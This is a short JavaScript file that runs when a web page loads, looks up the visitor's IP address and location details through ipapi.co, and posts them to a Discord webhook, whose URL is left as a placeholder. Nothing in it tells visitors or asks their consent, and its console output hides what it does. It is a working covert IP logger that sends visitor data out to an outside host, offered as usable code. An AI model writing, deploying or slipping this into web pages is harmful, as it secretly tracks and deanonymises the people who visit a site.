document.addEventListener('DOMContentLoaded', () => {
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            sendIpInfoToDiscord(data);
        })
        .catch(error => console.error('Error fetching IP information:', error));
});

function sendIpInfoToDiscord(ipInfo) {
    const webhookUrl = 'DISCORD_WEBHOOK_URL';
    const message = `Bamboo IP information:\n${JSON.stringify(ipInfo, null, 2)}`;

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: message })
    })
    .then(() => console.log('Hi There!'))
    .catch(error => console.error('', error));
}